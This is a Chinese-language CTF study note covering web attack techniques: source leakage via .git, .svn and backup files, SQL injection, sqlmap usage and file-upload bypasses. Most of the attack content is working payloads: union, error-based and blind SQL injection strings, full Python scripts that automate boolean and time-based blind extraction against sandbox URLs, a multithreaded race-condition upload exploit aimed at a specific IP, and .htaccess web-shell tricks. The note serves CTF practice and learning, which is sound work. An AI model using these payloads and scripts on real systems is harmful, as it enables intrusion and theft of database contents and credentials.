# CTF技能树
### 信息泄露：
#### 目录遍历：
一种是服务器配置不当造成：由于web服务器对于用户输入的文件名称安全性验证不足所导致的一种安全漏洞，使得攻击者通过一些特殊字符可以绕过服务器的安全限制，访问任意文件。  

原理：程序在实现上没有充分过滤用户输入的../之类的目录跳转符  

一种是代码开发：1）加密参数传递数据，比如base64，url编码后传入
2）目录限定绕过：可以通过~来绕过，例如 ?filename=~/../boot，直接跳转到硬盘目录下
3）绕过文件后缀过滤：%00截断
#### phpinfo：
phpinfo是一个运行指令，为显示php服务器的配置信息  
1）php version(版本)，System（操作系统），Loaded Configuration File（配置文件路径）   
2）重要参数：allow_url_fopen(允许打开URL文件)，allow_url_include(允许引用url文件)---执行php伪协议，远程包含shell  
3）open_basedir:可以将访问限制在某个目录下  
#### 备份文件下载：
##### 网站源码
常见源码备份文件后缀：tar，tar.gz,zip,rar  
常见源码备份文件名：web,website,backup,back,www,wwwroot,temp(使用dirsearch扫描)
##### bak文件
将备份文件放在了web目录下，访问url/index.php.bak
##### vim缓存
使用vim编辑器会留下vim缓存，当vim异常退出，缓存会一直留在服务器上，引起源码泄露。以index.php为例，第一次产生缓存文件为.index.php.swp，第二次.index.php.swo，第三次.index.php.swn。还可能会生成index.php~
##### .DS_Store
是MAC OS保存文件夹的自定义属性的隐藏文件。访问url/.DS_Store下载文件，是linux文件，使用工具python-dsstore打开
#### git泄露：
原理：开发人员操作不当直接将git源码发到在线平台上。步骤：dirsearch扫描发现存在.git，githacker --url url --output-folder 文件夹名。然后使用git log命令查看git日志。再使用命令【git diff + 版本commit】查看信息改动，获得flag。或者git reset --hard +commit可以回退到之前版本

Stash：使用 git stash pop命令

#### SVN泄露：
发人员使用 SVN 进行版本控制时使用不当，SVN1.7及以后版本则只在项目根目录生成一个.svn文件夹，里面的pristine文件夹包含了整个项目的所有文件备份
方法：./rip-svn.pl -v -u url/.svn/   然后 cd .svn（或者tree .svn）
#### HG泄露：
 使用Mercurial 进行版本控制时处理不当，和SVN大同小异
方法： ./rip-hg-pl -v -u url/.hg/
grep -r flag* 用来匹配flag文件  
<br>
<br>
<br>

### 密码口令：
弱口令：
默认口令：
字典爆破：
### SQL注入：
用户在查询时通过拼接一些恶意的sql语句来欺骗服务器达到不应该达到的地方
基本操作：  
连接数据库：mysql -uroot -ppassword  
显示所有数据库：show databases；数据太多的话加/G分页显示  
使用数据库:use databasename；  
查看当前数据库名称:select database();  
查看数据库表名称:show tables;  
查询数据:select * from tablename;  
查看表结构:desc tablename;  
查看创建表语句:show create table users\G  
!!不加引号表示字段名，加引号表示值,数字除外  
information_schema数据库是mysql自带的信息数据库，用于存储数据库元数据(关于数据的数据)，例如数据库名，表名，列的数据类型，访问权限等。其中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。其中有两个重要的表  
tables 表：  
table_schema:数据库名字段  
table_name:表名称字段  
columns表：  
column_name:列名称字段  
table_schema:表名称字段  
最后还有非常重要的schema_name字段保存当前数据库服务器里面所有库名的信息
#### 整数型注入：
?id=1输入后会有回显，证明是整型注入，输入变量没有用单引号
注入步骤：  
1:查询字段数： `?id=1 union order by 3`  
2:判断回显位：`?id=-1 union select 1,2,3`  
3:查询当前数据库名：`?id=-1 union select 1,2,database()`  
4:查询所有数据库名:`?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata`  
5：查询数据库下的表名：`?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名'`  
6:查询表下的列名字段:`?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' `  
7:查询数据:`id=-1 union select 1,2,group_concat(username,password) from 表名`
#### 字符型注入：
注入步骤： 
1:查询字段数： `?id=1' union order by 3 #`  
2:判断回显位：`?id=-1' union select 1,2,3 #`  
3:查询当前数据库名：`?id=-1' union select 1,2,database() #`  
4:查询所有数据库名:`?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata #`  
5：查询数据库下的表名：`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名' #`  
6:查询表下的列名字段:`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' #`  
7:查询数据:`id=-1' union select 1,2,group_concat(username,password) from 表名 #` 
#### 报错注入：
mysql5.1.5 开始，提供两个 XML 查询和修改的函数：extractvalue 和 updatexml。extractvalue 负责在 xml 文档中按照 xpath 语法查询节点内容，updatexml 则负责修改查询到的内容。
用法上extractvalue与updatexml的区别：updatexml使用三个参数，extractvalue只有两个参数。还有一种就是floor实现的group by主键重复
extractvalue注入步骤(整数型)：  
1:查库名:`1 and (select extractvalue(1, concat(0x7e, (select database()))))`  
2:查表名:`1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= '库名'))))`  
3:查列名:`1 and (select extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name= '表名'))))`  
4:查数据:`1 and (select extractvalue(1, concat(0x7e, (select 字段名 from 表名))))`  

updatexml注入步骤(整数型):  
1:查库名:`1 and (select updatexml(1, (concat (0x7e, (select database()))),1))`  
2:查表名:`1 and (select updatexml(1, (concat (0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='库名'))),1)) `  
3:查列名:`1 and (select updatexml(1, (concat (0x7e, (select group_concat(column_name) from information_schema.columns where table_name='表名'))),1)) `  
4:查数据:`1 and (select updatexml(1, concat(0x7e, (select 字段名 from 表名)), 1))`  

floor注入步骤(仅参考):
`1 union select count(*), concat((select database()), floor(rand(0)*2)) x from news group by x`  

`1 union select count(*), concat((select table_name from information_schema.tables where table_schema='库名' limit 1,1), floor(rand(0)*2)) x from news group by x`  

`1 union select count(*), concat((select column_name from information_schema.columns where table_name='表名' limit 0,1), floor(rand(0)*2)) x from news group by x`  

`1 union select count(*), concat((select 字段名 from 表名 limit 0,1), floor(rand(0)*2)) x from news group by x`  
#### 布尔型注入：
常见函数：length():返回字符串的长度  
substr():截取字符串  
ascii():返回字符的ascii码  
sleep(n):将程序挂起一段时间为n秒  
if(expr1,expr2,expr3):判断语句，如果第一个正确就执行第二个，错误就执行第三个  

注入步骤：  (以整形为例)
1：判断数据库长度:?id=1 and length(database())>3

2：判断数据库字符:1)1 and ascii(substr(database(),1,1))>100//判断第一个字符  
2)1 and ascii(substr(database(),2,1))>100//判断第二个字符

3：爆表:1)1 and (select count(table_name) from information_schema.tables
where table_schema=database())>3 //判断表个数  
2)1 and length((select table_name from information
_schema.tables where table_schema=database() limit 0,1))>6
//判断第一个表长度  
3)and ascii(substr((select table_name from information_
schema.tables where table_schema=database() limit 0,1),1,1))>100
//判断第一个表每个字符  

4:爆列：1 and (select count(column_name) from information_schema.columns
 where table_name='表名')>1//判断表中字段数  

 5：1 and ascii(substr((select column_name from information_schema.columns
 where table_name='表名'),1,1))>110//判断表中字段名  

 6:猜解flag(这是一个繁琐的工程，一般不用手工，应该用脚本完成)  
 1 and ascii(substr((select * from sqli.flag where id=1),1,1))>110  
1 and ascii(substr((select * from sqli.flag where id=1),2,1))>110  
1 and ascii(substr((select * from sqli.flag where id=1),3,1))>110  
......

附上自动化脚本:  
```python
#导入库
import requests

#设定环境URL，由于每次开启环境得到的URL都不同，需要修改！
url = 'http://challenge-8f6767445d88b9fb.sandbox.ctfhub.com:10800/'
#作为盲注成功的标记，成功页面会显示query_success
success_mark = "query_success"
#把字母表转化成ascii码的列表，方便便利，需要时再把ascii码通过chr(int)转化成字母
ascii_range = range(ord('a'),1+ord('z'))
#flag的字符范围列表，包括花括号、a-z，数字0-9
str_range = [123,125] + list(ascii_range) + list(range(48,58))

#自定义函数获取数据库名长度
def getLengthofDatabase():
	#初始化库名长度为1
    i = 1
    #i从1开始，无限循环库名长度
    while True:
        new_url = url + "?id=1 and length(database())={}".format(i)
        #GET请求
        r = requests.get(new_url)
        #如果返回的页面有query_success，即盲猜成功即跳出无限循环
        if success_mark in r.text:
        	#返回最终库名长度
            return i
        #如果没有匹配成功，库名长度+1接着循环
        i = i + 1

#自定义函数获取数据库名
def getDatabase(length_of_database):
	#定义存储库名的变量
    name = ""
    #库名有多长就循环多少次
    for i in range(length_of_database):
    	#切片，对每一个字符位遍历字母表
    	#i+1是库名的第i+1个字符下标，j是字符取值a-z
        for j in ascii_range:
            new_url = url + "?id=1 and substr(database(),{},1)='{}'".format(i+1,chr(j))
            r = requests.get(new_url)
            if success_mark in r.text:
            	#匹配到就加到库名变量里
                name += chr(j)
                #当前下标字符匹配成功，退出遍历，对下一个下标进行遍历字母表
                break
    #返回最终的库名
    return name

#自定义函数获取指定库的表数量
def getCountofTables(database):
	#初始化表数量为1
    i = 1
    #i从1开始，无限循环
    while True:
        new_url = url + "?id=1 and (select count(*) from information_schema.tables where table_schema='{}')={}".format(database,i)
        r = requests.get(new_url)
        if success_mark in r.text:
        	#返回最终表数量
            return i
        #如果没有匹配成功，表数量+1接着循环
        i = i + 1

#自定义函数获取指定库所有表的表名长度
def getLengthListofTables(database,count_of_tables):
	#定义存储表名长度的列表
	#使用列表是考虑表数量不为1，多张表的情况
    length_list=[]
    #有多少张表就循环多少次
    for i in range(count_of_tables):
    	#j从1开始，无限循环表名长度
        j = 1
        while True:
        	#i+1是第i+1张表
            new_url = url + "?id=1 and length((select table_name from information_schema.tables where table_schema='{}' limit {},1))={}".format(database,i,j)
            r = requests.get(new_url)
            if success_mark in r.text:
            	#匹配到就加到表名长度的列表
                length_list.append(j)
                break
            #如果没有匹配成功，表名长度+1接着循环
            j = j + 1
    #返回最终的表名长度的列表
    return length_list

#自定义函数获取指定库所有表的表名
def getTables(database,count_of_tables,length_list):
    #定义存储表名的列表
    tables=[]
    #表数量有多少就循环多少次
    for i in range(count_of_tables):
    	#定义存储表名的变量
        name = ""
        #表名有多长就循环多少次
        #表长度和表序号（i）一一对应
        for j in range(length_list[i]):
        	#k是字符取值a-z
            for k in ascii_range:
                new_url = url + "?id=1 and substr((select table_name from information_schema.tables where table_schema='{}' limit {},1),{},1)='{}'".format(database,i,j+1,chr(k))
                r = requests.get(new_url)
                if success_mark in r.text:
                	#匹配到就加到表名变量里
                    name = name + chr(k)
                    break
        #添加表名到表名列表里
        tables.append(name)
    #返回最终的表名列表
    return tables

#自定义函数获取指定表的列数量
def getCountofColumns(table):
	#初始化列数量为1
    i = 1
    #i从1开始，无限循环
    while True:
        new_url = url + "?id=1 and (select count(*) from information_schema.columns where table_name='{}')={}".format(table,i)
        r = requests.get(new_url)
        if success_mark in r.text:
        	#返回最终列数量
            return i
        #如果没有匹配成功，列数量+1接着循环
        i = i + 1

#自定义函数获取指定库指定表的所有列的列名长度
def getLengthListofColumns(database,table,count_of_column):
	#定义存储列名长度的变量
	#使用列表是考虑列数量不为1，多个列的情况
    length_list=[]
    #有多少列就循环多少次
    for i in range(count_of_column):
        #j从1开始，无限循环列名长度
        j = 1
        while True:
            new_url = url + "?id=1 and length((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1))={}".format(database,table,i,j)
            r = requests.get(new_url)
            if success_mark in r.text:
            	#匹配到就加到列名长度的列表
                length_list.append(j)
                break
            #如果没有匹配成功，列名长度+1接着循环
            j = j + 1
    #返回最终的列名长度的列表
    return length_list

#自定义函数获取指定库指定表的所有列名
def getColumns(database,table,count_of_columns,length_list):
	#定义存储列名的列表
    columns = []
    #列数量有多少就循环多少次
    for i in range(count_of_columns):
        #定义存储列名的变量
        name = ""
        #列名有多长就循环多少次
        #列长度和列序号（i）一一对应
        for j in range(length_list[i]):
            for k in ascii_range:
                new_url = url + "?id=1 and substr((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1),{},1)='{}'".format(database,table,i,j+1,chr(k))
                r = requests.get(new_url)
                if success_mark in r.text:
                	#匹配到就加到列名变量里
                    name = name + chr(k)
                    break
        #添加列名到列名列表里
        columns.append(name)
    #返回最终的列名列表
    return columns

#对指定库指定表指定列爆数据（flag）
def getData(database,table,column,str_list):
	#初始化flag长度为1
    j = 1
    #j从1开始，无限循环flag长度
    while True:
    	#flag中每一个字符的所有可能取值
        for i in str_list:
            new_url = url + "?id=1 and substr((select {} from {}.{}),{},1)='{}'".format(column,database,table,j,chr(i))
            r = requests.get(new_url)
            #如果返回的页面有query_success，即盲猜成功，跳过余下的for循环
            if success_mark in r.text:
            	#显示flag
                print(chr(i),end="")
                #flag的终止条件，即flag的尾端右花括号
                if chr(i) == "}":
                    print()
                    return 1
                break
        #如果没有匹配成功，flag长度+1接着循环
        j = j + 1

#--主函数--
if __name__ == '__main__':
	#爆flag的操作
	#还有仿sqlmap的UI美化
    print("Judging the number of tables in the database...")
    database = getDatabase(getLengthofDatabase())
    count_of_tables = getCountofTables(database)
    print("[+]There are {} tables in this database".format(count_of_tables))
    print()
    print("Getting the table name...")
    length_list_of_tables = getLengthListofTables(database,count_of_tables)
    tables = getTables(database,count_of_tables,length_list_of_tables)
    for i in tables:
        print("[+]{}".format(i))
    print("The table names in this database are : {}".format(tables))

	#选择所要查询的表
    i = input("Select the table name:")

    if i not in tables:
        print("Error!")
        exit()

    print()
    print("Getting the column names in the {} table......".format(i))
    count_of_columns = getCountofColumns(i)
    print("[+]There are {} tables in the {} table".format(count_of_columns,i))
    length_list_of_columns = getLengthListofColumns(database,i,count_of_columns)
    columns = getColumns(database,i,count_of_columns,length_list_of_columns)
    print("[+]The column(s) name in {} table is:{}".format(i,columns))

	#选择所要查询的列
    j = input("Select the column name:")

    if j not in columns:
        print("Error!")
        exit()

    print()
    print("Getting the flag......")
    print("[+]The flag is ",end="")
    getData(database,i,j,str_range)

```
#### 时间盲注：
适用条件：  
页面没有回显位置（联合注入无法使用）  
页面不显示数据库的报错信息（报错注入无法使用）  
无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）  
步骤(以整型为例)： 
1：判断是否存在时间盲注：1 and if(1,sleep(5),3) #

2:判断数据库长度:1 and if(length(database())>3,sleep(3),0) --+  

3:判断数据库名:1 and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+
//此为判断第一个字母的ascii码是否为115  

4:判断表名:1 and if(ascii(substr((select table_name from information_schema.tables where table_schema='库名' limit 0,1),1,1))=101,sleep(1),0)--+   // limit x,y),z,d,其中x代表第x+1个表，y表示第x+1往后y个单位的表，z表示第几个字母，d表示z往后d个单位的字母

5:判断列名：1 and If(ascii(substr((select column_name from information_schema.columns where table_name='表名' and table_schema=database() limit 0,1),1,1))=105,sleep(2),1)--+  

6:爆数据:1 and If(ascii(substr((select 字段名 from 表名 limit 0,1),1,1))=68,sleep(2),1)--+  
自动化脚本：
```python
#! /usr/bin/env python
# _*_  coding:utf-8 _*_
import requests
import sys
import time

session=requests.session()
url = "http://challenge-40227c2d653cf118.sandbox.ctfhub.com:10800/?id="
name = ""

for k in range(1,10):
	for i in range(1,10):
		print(i)
		for j in range(31,128):
			j = (128+31) -j
			str_ascii=chr(j)
			#数据库名
			payolad = "if(substr(database(),%s,1) = '%s',sleep(1),1)"%(str(i),str(str_ascii))
			#表名
			#payolad = "if(substr((select table_name from information_schema.tables where table_schema='库名' limit %d,1),%d,1) = '%s',sleep(1),1)" %(k,i,str(str_ascii))
			#字段名
			# payolad = "if(substr((select column_name from information_schema.columns where table_name='flag' and table_schema='sqli'),%d,1) = '%s',sleep(1),1)" %(i,str(str_ascii))
			start_time=time.time()
			str_get = session.get(url=url + payolad)
			end_time = time.time()
			t = end_time - start_time
			if t > 1:
				if str_ascii == "+":
					sys.exit()
				else:
					name+=str_ascii
					break
		print(name)

#查询字段内容
for i in range(1,50):
	print(i)
	for j in range(31,128):
		j = (128+31) -j
		str_ascii=chr(j)
		payolad = "if(substr((select 字段名 from sqli(库名).flag(表名),%d,1) = '%s',sleep(1),1)" %(i,str_ascii)
		start_time = time.time()
		str_get = session.get(url=url + payolad)
		end_time = time.time()
		t = end_time - start_time
		if t > 1:
			if str_ascii == "+":#适用于字段结尾是+号，就结束了
				sys.exit()
			else:
				name += str_ascii
				break
	print(name)

```


#### mysql结构：
#### cookie注入：
与传统的SQL注入基本上是一样，都是针对数据库的注入，就是注入的位置不同，注入形式不同，使用order by时不需要union（同样利用union来即可，遇到过滤空格用+号）
#### UA注入(User-Agent)：
和传统注入一样，这里注入点在HTTP的头部User-Agent上。在ctfhub上是把UA的内容全删了开始注入。使用order by时不需要union
#### refer注入：
同上，如果没有自己在请求报文加上referer即可
#### 空格注入：
空格绕过方式:1)$IFS$6  
2)/**/,类似于将中间部分注释掉，类似于：
```
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```
变成
```
SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'/**/AND/**/password/**/=/**/'password';

```
3)()例如
```
SELECT(*)FROM(users)WHERE(username)='admin'AND(password)='password';
```
4)%0a,是换行符的 URL 编码。有时候，如果空格被过滤，换行符可能会用于绕过简单的过滤。例如：
```
SELECT%0a*%0aFROM%0ausers%0aWHERE%0ausername='admin'%0aAND%0apassword='password';
```
#### update注入：
#### insert注入：
### SQLmap的使用:
参考博客：https://www.cnblogs.com/0yst3r-2046/p/10957616.html 
https://blog.csdn.net/smli_ng/article/details/106026901   
1)判断是否有注入点: sqlmap.py  -u  http://xxx/?id=1  
注：当注入点后的参数大于等于两个时，需要加双引号
sqlmap.py  -u “http://xxx/?id=1&uid=2 ”

2)判断文本中的请求是否存在注入
sqlmap可以从一个文本文件中获取http请求（这样的好处在于：不用设置其他参数，例如cookie、post数据等）  
sqlmap.py  -r  路径/1.txt  
注：-r一般存在cookie注入时使用  

3)查询当前用户下的所有数据库  
sqlmap.py  -u  http://192.168.1.xxx/sql1/less-1/?id=1 --dbs  
如果还需要在爆出来的指定数据库查询数据，则需要将上一条命令中的 --dbs 缩写成 -D xxx （意思是在xxx数据库中继续查询数据）  

4)获取数据库中的表名  
sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” -D dkeye --table  
注：将上一条命令中的--table缩写成-T时，表示在某表中继续查询  
若在该命令中不加-D参数来指定具体的数据库，那么sqlmap会把数据库中所有表列出  

5)获取表中的字段名  
sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1  ” -D dkeye -T user_info --columns
注：在后续注入中 --columns可以缩写成-C  

6)获取字段内容  
sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” -D dkeye -T user_info -C username，password --dump
这里获取的是dkeye数据库里的user_info表中的username和password的值

7)获取数据库的所有用户  
sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” --users  

8)获取数据库  
sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” --passwords  
可能密码涉及到md5加密，需要自行解密

9）获取当前网站数据库的名称  
sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” --current  -db  

10）获取当前网站数据库的用户名称  
sqlmap.py  -u  “http://192.168.1.xxx/sql1/union.php?id=1 ” --current  -user
### 文件上传：
#### 前端JS验证：
1）火狐浏览器输入about config禁用javascript  2）F12开发者模式修改JS代码后上传  3）burp抓包修改
#### 服务端效验：
##### content-Type绕过：
bp抓包修改成image/jpeg  

##### 文件名绕过：
 Apache HTTP 服务器，可以尝试phtml,php3,php4,php5,pht等后缀名，但前提是配置文件中有 AddType application/x-httpd-php .php .phtml .phps .php5 .pht .htaccess

#### .htaccess绕过:Apache服务器
通过重写文件解析规则绕过，将.jpg文件当成php文件执行。内容诸如`<FilesMatch "shell.jpg">
SetHandler application/x-httpd-php
</FilesMatch>`注意先上传.htaccess再上传图片木马

#### 大小写绕过：
例如strtolower函数将所有字符转成小写，xx.pHp

#### 后缀加空格,点绕过：
例如传入的xx.php，在php后加一个空格或者一个.即可绕过。还可以.+空格+.绕过
#### Windows文件流特性绕过
文件名改成xx.php::$DATA,上传成功后保存xx.php
#### MIME绕过：
通过修改Content-Type的值来进行绕过
#### 00截断：
原理：0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕开检测。上传路径%00截断:save_path改成/upload/11.php%00，最后保存下来就是11.php
条件：php<5.3.29，且magic_quotes_gpc关闭
**POST**：%00在GET中被url解码后是空字符，但是在POST中%00不会被url解码。所以只能通过burpsuite修改hex值为00进行截断
#### 双写绕过：
文件名改成xx.phphpp，适用与检测到非法后缀就直接删除
#### 文件头部检查：
GIF89a  
图片马的制作！！  
常见题目：使用getimagesize获取文件类型，使用php_exif判断文件类型可以直接使用图片马
#### 条件竞争：
出现了先保存文件在判断然后删除的bug。
解题方法：通过不断上传一个木马文件，并不断访问，总能在其删除之前访问到它。一旦访问到，就会执行所在文件的php代码，生成另外一个木马文件通过蚁剑连接  
代码示列：
```python
import requests
import threading
import os

class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

        self.url = 'http://61.147.171.105:53486/upload/b.php'
        self.uploadUrl = 'http://61.147.171.105:53486/upload.php'

    def _get(self):
        print('try to call uploaded file...')

        r = requests.get(self.url)
        if r.status_code == 200:
            print('[*] create file heihei.php success.')
            os._exit(0)

    def _upload(self):
        print('upload file...')
        file = {'file': open('D:\\CTF\\b.php', 'r')}
        requests.post(self.uploadUrl, files=file)


    def run(self):
        while True:
            for i in range(5):
                self._get()

            for i in range(10):
                self._upload()
                self._get()

if __name__ == '__main__':
    threads = 5

    for i in range(threads):
        t = RaceCondition()
        t.start()

    for i in range(threads):
        t.join()

```
### XSS：
反射型：
存储型：
DOM型：
### SSRF：
内网访问：
伪协议读取文件：
端口扫描：
post请求：
上传文件：
fastCG协议：
redis协议：
### BY PASS：
url：
数字IP：
302跳转:
DNS重绑定：
### 远程命令执行RCE：
eval执行：
#### 文件包含
本地文件包含：
远程文件包含：
#### 命令注入：
过滤cat
过滤空格
目录分割分隔符
过滤运算符：
#### 为协议篇：
php
子主题2
